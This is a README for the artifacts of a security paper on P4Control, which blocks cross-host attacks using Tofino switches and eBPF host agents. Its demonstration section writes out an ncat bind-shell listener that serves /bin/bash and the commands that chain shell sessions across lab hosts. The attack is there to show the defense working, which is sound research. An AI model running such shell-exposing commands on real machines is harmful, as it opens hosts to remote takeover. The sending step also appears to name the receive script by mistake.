# P4Control

This repository contains the artifacts for the paper titled "P4Control: Line-Rate Cross-Host Attack Prevention via In-Network Information Flow Control Enabled by Programmable Switches and eBPF", accepted at 45th IEEE Symposium on Security and Privacy (IEEE S&P / Oakland), 2024. For questions, please reach out to [Osama Bajaber](mailto:obajaber@vt.edu).

## Dependencies
- Python 3.7 
- Tofino Switch SDE 9.7.0
- BCC (Linux 5.15.0)
- Bison 3.8.2
- Flex 2.6.4
- Scapy 2.4.5

## Setup
Current settings assume three hosts are linked to the Tofino switch, each assigned with the following IP addresses and labels. (feel free to adjust these settings as per your topology)
- ```Host1```, 10.0.0.1, Label={HOST1}
- ```Host2```, 10.0.0.2, Label={HOST2}
- ```Host3```, 10.0.0.3, Label={HOST3}

## How to use

### Run P4 Switch program
Make sure you have installed the Tofino switch SDE and set the environment variables ```SDE=~/bf-sde-9.7.0/``` and ```SDE_INSTALL=~/bf-sde-9.7.0/install```

Step 1: Build the P4 program
```
./p4_build.sh -p switch/p4control.p4
```

Step 2: Run the switch program in the Tofino switch
```
./run_switchd.sh -p p4control
```

Step 3: Start the control plane
```
python3 switch/controller.py
```

This will load ```P4Control``` in the designated Tofino switch and run the control plane. The current control plane code inserts the needed ```NetCL``` policies to block traffic between ```Host1``` and ```Host3```.

### Run eBPF-based host agent

Now, as the switch program is running, load the eBPF host agent to the hosts. We tested the host agent on Ubuntu 20.04.1 LTS, but it should work with other versions. Make sure to update the correct interface name in ```host_agent/host_agent.py```.

Step 0: ```host_agent/host_agent_ebpf.c``` provides the ability to manually label a specific PID with a custom DIFC label for easy configuration

In your opened terminal, check the PID of the current bash process by executing the following
```
 ps
```
 
Copy the PID of the bash process to the defined ```TAGGED_TERMINAL``` variable at the top of ```host_agent/host_agent_ebpf.c```
```
u32 TAGGED_TERMINAL = <PID>;
```

Step 1: Run the host agent in all three hosts. The following command will attach all the needed eBPF programs inside the kernel
```
python3 host_agent/host_agent.py
```

### Perform a cross-host attack

To perform a cross-host attack from Host1 to Host3, using Host2 as a stepping stone

Step 1: In ```Host2``` and ```Host3```, start a ```ncat``` listener 
```
sudo ncat -nlvp 9999 -e /bin/bash
```

Step 2: From ```Host1```, connect to ```Host2```
```
sudo ncat 10.0.0.2 9999
```

Step 3: From ```Host1``` establish a session to ```Host3``` through ```Host2```
```
ncat 10.0.0.3 9999
```

P4Control will block the last connection as the label {Host1} is detected.

### Compile ```NetCL``` rules

To compile ```NetCL``` rules

Step 1: Run the following command
```
./netcl-compile -i <netcl_rules> -o <compiled_rules>
```

### Run custom tools

To use the custom tools to send and receive customized packets with DIFC headers

Step 1: At the receiving host, run the following to start sniffing packets
```
python3 custom-receive.py
```

Step 2: At the sending host, run the following command to send the custom packet
```
python3 custom-receive.py <destination_IP> <label> <tracker> <message>
```


## Cite the paper

If you like or use our work, please cite us using:

```
@INPROCEEDINGS {bajaber2024p4control,
author = {O. Bajaber and B. Ji and P. Gao},
title = {P4Control: Line-Rate Cross-Host Attack Prevention via In-Network Information Flow Control Enabled by Programmable Switches and eBPF},
booktitle = {IEEE Symposium on Security and Privacy (S\&P)},
year = {2024},
pages = {146-146},
}
```
